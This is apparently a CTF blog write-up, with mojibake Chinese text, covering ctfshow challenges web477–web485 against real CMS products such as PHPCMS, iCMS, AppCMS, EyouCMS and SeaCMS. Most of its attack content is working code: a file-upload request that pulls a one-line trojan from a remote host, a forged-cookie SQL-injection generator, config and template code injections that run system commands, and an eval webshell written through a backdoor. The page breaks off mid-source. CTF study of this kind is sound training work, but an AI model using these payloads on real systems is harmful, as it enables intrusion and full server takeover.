<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[ctfshow]CMS | fallingskies</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">


  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
  

  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="web477
CmsEasy
åå°åœ°å€ä¸º/admin
ä½¿ç”¨è´¦å·admin/adminç™»å½•
è‡ªå®šä¹‰æ ‡ç­¾åŠŸèƒ½å¤„å­˜åœ¨æ¼æ´
åœ¨æ ‡ç­¾å†…å®¹å¤„å¡«å†™&lt;?php phpinfo()?&gt;
ç‚¹å‡»é¢„è§ˆå³å¯
web478
PHPCMS
è®¿é—®å®‰è£…è·¯å¾„/in..." />
    <meta name="keywords" content="" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://fallingskies22.github.io">
        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
        <h1 class="site-title">fallingskies</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="/post/friends" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      <h3>æƒ³è¦å»æœˆçƒ<h3>
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[ctfshow]CMS</h2>
            <div class="post-date">2024-07-15</div>
            
              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowcms.jpg')">
              </div>
            
            <div class="post-content" v-pre>
              <h2 id="web477">web477</h2>
<p>CmsEasy</p>
<p>åå°åœ°å€ä¸º<code>/admin</code><br>
ä½¿ç”¨è´¦å·admin/adminç™»å½•</p>
<p>è‡ªå®šä¹‰æ ‡ç­¾åŠŸèƒ½å¤„å­˜åœ¨æ¼æ´<br>
åœ¨æ ‡ç­¾å†…å®¹å¤„å¡«å†™<code>&lt;?php phpinfo()?&gt;</code></p>
<p>ç‚¹å‡»é¢„è§ˆå³å¯</p>
<h2 id="web478">web478</h2>
<p>PHPCMS</p>
<p>è®¿é—®å®‰è£…è·¯å¾„<code>/install/install.php</code>è¿›è¡Œå®‰è£…ã€‚</p>
<p>å‚è€ƒæ–‡ç« <br>
https://www.freebuf.com/articles/web/290031.html<br>
https://xz.aliyun.com/t/5730<br>
https://github.com/jiangsir404/PHP-code-audit/blob/master/phpcms/phpcmsv9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md</p>
<p>å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p>
<p>è¿œç¨‹æœåŠ¡å™¨ä¸Šæ”¾ç½®åä¸º2.txtçš„ä¸€å¥è¯æœ¨é©¬ã€‚<br>
payload</p>
<pre><code class="language-http">POST /index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 HTTP/1.1
Host: d8af37c9-6857-475d-b5e6-8be363435c2a.challenge.ctf.show
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 169
Content-Type: application/x-www-form-urlencoded

siteid=1&amp;modelid=11&amp;username=test&amp;password=test123&amp;email=test123@163.com&amp;info[content]=&lt;img src=http://ip:port/2.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1721269274559.png" alt="" loading="lazy"></figure>
<p>æ³¨æ„ï¼šæ¯è·‘ä¸€æ¬¡payloadéœ€è¦ä¿®æ”¹ç”¨æˆ·åå’Œé‚®ç®±ï¼Œä¸ç„¶ç”±äºç”¨æˆ·åå­˜åœ¨ä¼šæŠ¥é”™ã€‚</p>
<h2 id="web479">web479</h2>
<p>iCMS</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://github.com/Y4tacker/Web-Security/blob/4aac5ffb955667b15ee3110fb99f6df1016c6760/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9EAndCMS%E5%AE%A1%E8%AE%A1/CMS/iCMS/iCMS-7.0.1%E5%89%8D%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/1.md">iCMS-7.0.1åå°ç™»å½•ç»•è¿‡åˆ†æ</a></p>
<p>æ ¹æ®æç¤ºä½¿ç”¨é»˜è®¤keyç”Ÿæˆcookieï¼Œåå°åœ¨è§£ææ—¶äº§ç”Ÿsqlæ³¨å…¥ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç ç»•è¿‡ç™»å½•éªŒè¯ã€‚</p>
<pre><code class="language-php">&lt;?php
//error_reporting(0);
function urlsafe_b64decode($input){
    $remainder = strlen($input) % 4;
    if ($remainder) {
        $padlen = 4 - $remainder;
        $input .= str_repeat('=', $padlen);
    }
    return base64_decode(strtr($input, '-_!', '+/%'));
}

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length   = 8;
    $key           = md5($key ? $key : iPHP_KEY);
    $keya          = md5(substr($key, 0, 16));
    $keyb          = md5(substr($key, 16, 16));
    $keyc          = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey      = $keya.md5($keya.$keyc);
    $key_length    = strlen($cryptkey);

    $string        = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result        = '';
    $box           = range(0, 255);

    $rndkey        = array();
    for($i = 0; $i &lt;= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i &lt; 256; $i++) {
        $j       = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp     = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
        $a       = ($a + 1) % 256;
        $j       = ($j + $box[$a]) % 256;
        $tmp     = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result  .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
}

echo &quot;iCMS_iCMS_AUTH=&quot;.urlencode(authcode(&quot;'or 1=1##=iCMS[192.168.0.1]=#1&quot;,&quot;ENCODE&quot;,&quot;n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk&quot;));
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1721299503041.png" alt="" loading="lazy"></figure>
<h2 id="web480">web480</h2>
<p>åˆ†ææä¾›æºç </p>
<pre><code class="language-php">&lt;?php

class config{
	public static function init(){
		foreach ($_REQUEST['conf'] as $key =&gt; $value) {
	     	config::change($key, $value);
		}
	}

	public static function change($k,$v){
		$conf = self::parseFile('config.php');
	    $conf[$k] = $v;
	    self::saveValues($conf);
	}
	public static function parseFile($file)
    {
        $options = array();
        foreach (file($file) as $line) {
            $line = trim(preg_replace(array(&quot;/^.*define\([\&quot;']/&quot;, &quot;/[^&amp;][#][@].*$/&quot;), &quot;&quot;, $line));
            if ($line != &quot;&quot; &amp;&amp; substr($line, 0, 2) != &quot;&lt;?&quot; &amp;&amp; substr($line, -2, 2) != &quot;?&gt;&quot;) {
                $line = str_replace(array(&quot;&lt;?php&quot;, &quot;?&gt;&quot;, &quot;&lt;?&quot;,), &quot;&quot;, $line);

                $opts = preg_split(&quot;/[\&quot;'],/&quot;, $line);

                if (count($opts) == 2) {
                    if (substr($opts[1], 0, 1) == '&quot;' || substr($opts[1], 0, 1) == &quot;'&quot;) {
                        $opts[1] = substr($opts[1], 1, -3);
                    } else {
                        $opts[1] = substr($opts[1], 0, -2);
                    }

                    if (substr($opts[0], -5, 5) == &quot;_HTML&quot;) {
                        $opts[1] = eval(&quot;return &quot; . $opts[1] . &quot;;&quot;);
                    }
                    $options[$opts[0]] = str_replace(&quot;\'&quot;, &quot;'&quot;, $opts[1]);
                }
            }
        }
        return $options;
    }
	public static function saveValues($values, $configname = '')  
    {
        $profile = null;
        $str = &quot;&lt;?php\n&quot;;
        foreach ($values as $directive =&gt; $value) {
            $directive = trim(strtoupper($directive));
            if ($directive == 'CURRENTCONFIGNAME') {  
                $profile = $value;
                continue;
            }
            $str .= &quot;define(\&quot;$directive\&quot;,&quot;;
            $value = stripslashes($value); 
            if (substr($directive, -5, 5) == &quot;_HTML&quot;) {
                $value = htmlentities($value, ENT_QUOTES, LANG_CHARSET);
                $value = str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, $value);
                $str .= &quot;exponent_unhtmlentities('$value')&quot;;
            } elseif (is_int($value)) {
                $str .= &quot;'&quot; . $value . &quot;'&quot;;
            } else {
                if ($directive != 'SESSION_TIMEOUT') {
                    $str .= &quot;'&quot; . str_replace(&quot;'&quot;, &quot;\'&quot;, $value) . &quot;'&quot;; 
                }
                else {
                    $str .= &quot;'&quot; . str_replace(&quot;'&quot;, '', $value) . &quot;'&quot;;
                }
            }
            $str .= &quot;);\n&quot;;
        }

        $str .= '?&gt;';
        if ($configname == '') {
            $str .= &quot;\n&lt;?php\ndefine(\&quot;CURRENTCONFIGNAME\&quot;,\&quot;$profile\&quot;);\n?&gt;&quot;; 
        }
        self::writeFile($str, $configname);
    }

    public static function writeFile($str, $configname = '')
    {
        if ($configname == &quot;&quot;) {
            $configname = &quot;config.php&quot;;
        }
        $conffolder = pathinfo($configname);
        if (file_exists($configname)) {
            $fh = fopen($configname, &quot;w&quot;);
            fwrite($fh, $str);
            fclose($fh);
        } else {
            echo('Unable to write configuration') . '&lt;br /&gt;';
        }
    }


}
</code></pre>
<p>å¯ä»¥é€šè¿‡<code>saveValues</code>å‡½æ•°ä¸­çš„<code>$profile</code>å‚æ•°ï¼Œæ³¨å…¥phpä»£ç åˆ°<code>config.php</code>ä¸­ã€‚</p>
<p>payload</p>
<pre><code>?conf[CURRENTCONFIGNAME]=&quot;);?&gt;%0a&lt;?php%20system(%27cat%20/flag%27);?&gt;
</code></pre>
<h2 id="web481">web481</h2>
<p>æç¤ºappcms 2.0.*<br>
å¹¶ä¸”æä¾›äº†index.phpæºç </p>
<pre><code class="language-php">&lt;?php
error_reporting(0);

if(md5($_GET['session'])=='3e858ccd79287cfe8509f15a71b4c45d'){
$configs=&quot;c&quot;.&quot;o&quot;.&quot;p&quot;.&quot;y&quot;;
$configs(trim($_GET['url']),$_GET['cms']);}

?&gt;
nothing here
</code></pre>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">AppCMS 2.0.101 åé—¨åˆ†æ</a></p>
<p>payload</p>
<pre><code>POST /?session=ctfshow&amp;url=php://input&amp;cms=shell.php
&lt;?php @eval($_POST[1]);?&gt;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1721353052651.png" alt="" loading="lazy"></figure>
<h2 id="web482">web482</h2>
<p>zzcms8.1</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/2204326">zzcms8.1é‡è£…æ¼æ´</a></p>
<p>è®¿é—®<code>install/index.php</code>è¿›è¡Œé‡è£…ï¼Œpostä¸Šä¼ <code>step=2</code>æ¥ç»•è¿‡lockçš„æ£€æµ‹ã€‚</p>
<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1721361962277.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œéœ€è¦å°†åœ°å€æ”¹ä¸º127.0.0.1,localhostä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œã€‚</p>
<p>å®‰è£…æˆåŠŸåå°±èƒ½å¾—åˆ°flag</p>
<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1721362079850.png" alt="" loading="lazy"></figure>
<p>åŸæœ¬è¿™ä¸ªé‡è£…å¤„è¿˜æœ‰ä¸€ä¸ªä»£ç æ³¨å…¥çš„æ¼æ´ã€‚</p>
<p>/admin/siteconfig.php<br>
<img src="https://fallingskies22.github.io/post-images/1721362157272.png" alt="" loading="lazy"></p>
<p>åœ¨å®‰è£…ç¬¬äº”æ­¥æ—¶ï¼Œä¾‹å¦‚åœ¨<code>siteurl</code>å‚æ•°ä¸­æ’å…¥<code>http://127.0.0.1&quot;);phpinfo();</code>å°±èƒ½å°†ä»£ç æ³¨å…¥åˆ°<code>inc/config.php</code>ä¸­ã€‚</p>
<h2 id="web483">web483</h2>
<p>é½åšcms7.0</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/2248">é½åšcmsv7.0åå°getshell</a></p>
<p>åœ¨æ ç›®æ·»åŠ åŠŸèƒ½å¤„å¢åŠ æ ç›®<code>${system($_GET[1])}</code></p>
<figure data-type="image" tabindex="6"><img src="https://fallingskies22.github.io/post-images/1721441296211.png" alt="" loading="lazy"></figure>
<p>è®¿é—®<code>/data/guide_fid.php</code>å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<h2 id="web484">web484</h2>
<p>eyoucms<br>
å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_48985780/article/details/121945304">EyouCmså‰å°GetShellæ¼æ´å¤ç°</a></p>
<p>æ¼æ´ç‚¹ä½äº<code>application\api\controller\Uploadify.php</code></p>
<pre><code class="language-php">&lt;?php
$src = file_get_contents('php://input');//ä½¿ç”¨phpä¼ªåè®®å†™å…¥
        if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) { //matchesè¢«èµ‹å€¼ä¸ºæœç´¢å‡ºæ¥çš„ç»“æœ
            $previewUrl = sprintf(
                &quot;%s://%s%s&quot;,//ç±»cçš„è¾“å‡ºè¯­è¨€
                isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',//è¾“å‡ºhttpæˆ–è€…https
                $_SERVER['HTTP_HOST'],$_SERVER['REQUEST_URI']//hostï¼Œä¸é‡è¦çš„ä¸œè¥¿
            );
            $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);//å¦‚æœpreviewUrlä¹Ÿæœ‰preview.phpåˆ™è¿‡æ»¤
            $base64 = $matches[2];//è·å–base64æ•°æ®
            $type = $matches[1];//è·å–base64åç¼€
            if ($type === 'jpeg') {
                $type = 'jpg';
            }//æ²¡ä»€ä¹ˆç”¨çš„åˆ¤æ–­
        
            $filename = md5($base64).&quot;.$type&quot;;//å°†ä¼ å…¥çš„base64é‚£å„¿è¿›è¡Œmd5åŠ å¯†ï¼Œå†æ·»ä¸Šæ–‡ä»¶ç±»å‹
            $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;//æ–‡ä»¶å­˜æ”¾è·¯å¾„ä½preveiw/æ–‡ä»¶å
        
            if (file_exists($filePath)) {//å­˜åœ¨å³è¿”å›å­˜åœ¨çš„è·¯å¾„
                die('{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;'.$previewUrl.'preview/'.$filename.'&quot;, &quot;id&quot; : &quot;id&quot;}');
            } else {
                $data = base64_decode($base64);//ä¸å­˜åœ¨å°±è¿›è¡Œbase64è§£å¯†
                file_put_contents($filePath, $data);//å¹¶ä¸”å†™å…¥æ–‡ä»¶
                die('{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;'.$previewUrl.'preview/'.$filename.'&quot;, &quot;id&quot; : &quot;id&quot;}');//è¿”å›æ–‡ä»¶è·¯å¾„
            }
</code></pre>
<p>å†™å…¥phpæ–‡ä»¶ã€‚</p>
<pre><code>POST /index.php/api/uploadify/preview HTTP/1.1
data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://fallingskies22.github.io/post-images/1721487156413.png" alt="" loading="lazy"></figure>
<p>è®¿é—®è·¯å¾„<code>/preview/c7a10e2172ba0f171ec45f376fb0601d.php</code>å³å¯æŸ¥çœ‹phpinfoé¡µé¢ã€‚<br>
è¿™é‡Œç¯å¢ƒå˜é‡çš„flagä¸å¯¹ğŸ¤¡<br>
è¿˜æ˜¯è€å®å†™ä¸ªshellè¿ä¸ŠæŸ¥çœ‹<code>/flag</code></p>
<h2 id="web485">web485</h2>
<p>æµ·æ´‹CMS<br>
è®¿é—®<code>/data/admin/ver.txt</code>æŸ¥çœ‹ç‰ˆæœ¬å·ä¸ºV210202<br>
æœç´¢åˆ°ç›¸å…³cveï¼šhttps://wlfw.zepc.edu.cn/info/1712/58482.htm</p>
<p>ç™»ä¸ä¸Šåå°å•Š<code>/admin</code>ï¼Œä¸çŸ¥é“å’‹æ<br>
<img src="https://fallingskies22.github.io/post-images/1722670803293.png" alt="" loading="lazy"></p>
<p>çœ‹ä¸‹æºç é‡Œæ€ä¹ˆå†™çš„ã€‚æœä¸€ä¸‹å‘Šè­¦ï¼Œå‘ç°åœ¨<br>
<code>admin/templets/login.htm</code></p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;åå°ç®¡ç†ä¸­å¿ƒ&lt;/title&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;link href=&quot;js/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;link href=&quot;js/css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;js/css/styles1.css&quot; title=&quot;styles1&quot; media=&quot;screen&quot; /&gt;
&lt;style&gt;
.submit_btn{background: #00b7ee;}
&lt;/style&gt;
&lt;script src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;js/styleswitch.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;js/Particleground.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$(document).ready(function() {
  $('body').particleground({
    dotColor: 'rgba(95,184,120,0.5)',
    lineColor: 'rgba(95,184,120,0.5)'
  });
});
&lt;/script&gt;
&lt;style type=&quot;text/css&quot;&gt;
  html,body{height: 100%;position: relative;background-color:#5fb878!important;background-image: linear-gradient(to right bottom, #0066CC , #5fb878)!important;}
  .admin_login{box-shadow:0 0 15px #555555;}
&lt;/style&gt;
&lt;/head&gt;
&lt;body onload=&quot;javascript:document.formsearch.userid.focus();&quot; id=&quot;canvas&quot;&gt;
  &lt;div class=&quot;admin_login&quot;&gt;
    &lt;form method=&quot;post&quot; action=&quot;login.php&quot; name=&quot;formsearch&quot; id=&quot;formsearch&quot;&gt;
	 &lt;input type=&quot;hidden&quot; name=&quot;gotopage&quot; value=&quot;&lt;?php if(!empty($gotopage)) echo $gotopage;?&gt;&quot; /&gt;
      	&lt;input type=&quot;hidden&quot; name=&quot;dopost&quot; value=&quot;login&quot; /&gt;
    &lt;div class=&quot;admin_title&quot;&gt;
       &lt;strong&gt;æµ·æ´‹&lt;span style=&quot;color:#5FB878&quot;&gt;CMS&lt;/span&gt; ç«™ç‚¹ç®¡ç†ç³»ç»Ÿ&lt;/strong&gt;
       &lt;em&gt;SeA Content Management System&lt;/em&gt;
    &lt;/div&gt;
    &lt;div class=&quot;admin_user&quot;&gt;
       &lt;input type=&quot;text&quot; name=&quot;userid&quot; placeholder=&quot;ç®¡ç†å‘˜è´¦å·&quot; class=&quot;login_txt&quot;&gt;
    &lt;/div&gt;
    &lt;div class=&quot;admin_pwd&quot;&gt;
       &lt;input type=&quot;password&quot; name=&quot;pwd&quot; placeholder=&quot;ç®¡ç†å‘˜å¯†ç &quot; class=&quot;login_txt&quot;&gt;
    &lt;/div&gt;
	
	&lt;?php $v=file_get_contents(&quot;../data/admin/adminvcode.txt&quot;); ?&gt;
    &lt;div class=&quot;admin_val&quot; style=&quot;&lt;?php if($v==0) echo 'display:none;'; ?&gt;&quot;&gt;
       &lt;input type=&quot;text&quot; name=&quot;validate&quot; placeholder=&quot;éªŒè¯ç &quot; maxlength=&quot;4&quot; class=&quot;login_txt left&quot; style=&quot;text-transform:uppercase;&quot;&gt;
       &lt;div id=&quot;yzm&quot; class=&quot;right&quot;&gt;&lt;img id='code_img' onClick=&quot;this.src=this.src+'?get=' + new Date()&quot; src='../include/vdimgck.php'&gt;&lt;/div&gt;
    &lt;/div&gt;
	
    &lt;div class=&quot;admin_sub&quot;&gt;
&lt;?php
//æ£€æµ‹åå°ç›®å½•æ˜¯å¦æ›´å
$cdir=strtolower($cdir);
if($cdir==&quot;/admin/login.php&quot;)
{
	echo '&lt;font style=&quot;color: #c10f0f;font-weight: bold;font-size: 12px;&quot;&gt;åå°ç›®å½•åä¸èƒ½æ˜¯adminï¼Œè¯·ä¿®æ”¹åé‡è¯•ï¼';
}
else
{
	echo '&lt;input type=&quot;submit&quot; value=&quot;ç«‹å³ç™»é™†&quot; class=&quot;submit_btn&quot;&gt;';
}
?&gt;
    &lt;/div&gt;
    &lt;div class=&quot;admin_info&quot;&gt;
        &lt;p style=&quot;color: #555&quot;&gt;Â© SEACMS.NET&lt;/p&gt;
    &lt;/div&gt;
    &lt;/form&gt;   
  &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>çœ‹ä¸‹<code>admin/login.php</code>é‡Œé€»è¾‘ï¼Œæœ€åæ‰ä¼š<code>include('templets/login.htm');</code>ï¼Œå°±æ˜¯è¯´è¿™é‡Œè¿˜æ˜¯å¯ä»¥ç™»é™†çš„ï¼Œåªæ˜¯è¦æ‰‹åŠ¨å‘åŒ…ã€‚</p>
<pre><code class="language-php">&lt;?php 
//ç•¥

if($dopost=='login' AND $v==0)
{
		$cuserLogin = new userLogin($admindir);
		if(!empty($userid) &amp;&amp; !empty($pwd))
		{
			$res = $cuserLogin-&gt;checkUser($userid,$pwd);

			//success
			if($res==1)
			{
				$cuserLogin-&gt;keepUser();
				$_SESSION['hashstr']=$hashstr;
				if(!empty($gotopage))
				{
					ShowMsg('æˆåŠŸç™»å½•ï¼Œæ­£åœ¨è½¬å‘ç®¡ç†ç®¡ç†ä¸»é¡µï¼',$gotopage);
					exit();
				}
				else
				{
					ShowMsg('æˆåŠŸç™»å½•ï¼Œæ­£åœ¨è½¬å‘ç®¡ç†ç®¡ç†ä¸»é¡µï¼',&quot;index.php&quot;);
					exit();
				}
			}

			//error
			else if($res==-1)
			{
				ShowMsg('ä½ çš„ç”¨æˆ·åä¸å­˜åœ¨!','-1');
				exit();
			}
			else
			{
				ShowMsg('ä½ çš„å¯†ç é”™è¯¯!','-1');
				exit();
			}
		}

		//password empty
		else
		{
			ShowMsg('ç”¨æˆ·å’Œå¯†ç æ²¡å¡«å†™å®Œæ•´!','-1');
				exit();
		}

}
$cdir = $_SERVER['PHP_SELF']; 
include('templets/login.htm');

?&gt;
</code></pre>
<p>ä½¿ç”¨admin/adminç™»å½•åå°<br>
<img src="https://fallingskies22.github.io/post-images/1722671038611.png" alt="" loading="lazy"></p>
<p>æ ¹æ®æ–‡ç« æç¤ºï¼Œæ¼æ´åœ¨<code>admin_notify.php</code>,çœ‹ä¸‹æºç ã€‚</p>
<pre><code class="language-php">&lt;?php 
header('Content-Type:text/html;charset=utf-8');
require_once(dirname(__FILE__).&quot;/config.php&quot;);
CheckPurview();
if($action==&quot;set&quot;)
{
	$notify1= $_POST['notify1'];
	$notify2= $_POST['notify2'];
	$notify3= $_POST['notify3'];
	$open=fopen(&quot;../data/admin/notify.php&quot;,&quot;w&quot; );
	$str='&lt;?php  ';
	$str.='$notify1 = &quot;';
	$str.=&quot;$notify1&quot;;
	$str.='&quot;; ';
	$str.='$notify2 = &quot;';
	$str.=&quot;$notify2&quot;;
	$str.='&quot;; ';
	$str.='$notify3 = &quot;';
	$str.=&quot;$notify3&quot;;
	$str.='&quot;; ';
	$str.=&quot; ?&gt;&quot;;
	fwrite($open,$str);
	fclose($open);
	ShowMsg(&quot;æˆåŠŸä¿å­˜è®¾ç½®!&quot;,&quot;admin_notify.php&quot;);
	exit;
}

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;ä¼šå‘˜æ¶ˆæ¯é€šçŸ¥&lt;/title&gt;
&lt;link  href=&quot;img/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;link  href=&quot;img/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;script src=&quot;js/common.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;js/main.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script type=&quot;text/JavaScript&quot;&gt;if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='åå°é¦–é¡µ&amp;nbsp;&amp;raquo;&amp;nbsp;ç®¡ç†å‘˜&amp;nbsp;&amp;raquo;&amp;nbsp;ç™¾åº¦ä¸»åŠ¨æ¨é€è®¾ç½® ';&lt;/script&gt;
&lt;div class=&quot;r_main&quot;&gt;
  &lt;div class=&quot;r_content&quot;&gt;
    &lt;div class=&quot;r_content_1&quot;&gt;
&lt;form action=&quot;?action=set&quot; method=&quot;post&quot;&gt;	
&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tb_style&quot;&gt;
&lt;tbody&gt;&lt;tr class=&quot;thead&quot;&gt;
&lt;td colspan=&quot;5&quot; class=&quot;td_title&quot;&gt;ä¼šå‘˜æ¶ˆæ¯é€šçŸ¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;?php  require_once(&quot;../data/admin/notify.php&quot;); ?&gt;


&lt;tr&gt;
&lt;td width=&quot;80%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
&lt;br&gt;é€šçŸ¥1ï¼š&lt;br&gt;&lt;textarea name=&quot;notify1&quot; style=&quot;width:600px; height:60px;&quot;&gt;&lt;?php  echo $notify1;?&gt;&lt;/textarea&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;80%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
&lt;br&gt;é€šçŸ¥2ï¼š&lt;br&gt;&lt;textarea name=&quot;notify2&quot; style=&quot;width:600px; height:60px;&quot;&gt;&lt;?php  echo $notify2;?&gt;&lt;/textarea&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;80%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
&lt;br&gt;é€šçŸ¥3ï¼š&lt;br&gt;&lt;textarea name=&quot;notify3&quot; style=&quot;width:600px; height:60px;&quot;&gt;&lt;?php  echo $notify3;?&gt;&lt;/textarea&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;10%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;ç¡® è®¤&quot; class=&quot;btn&quot; &gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;90%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
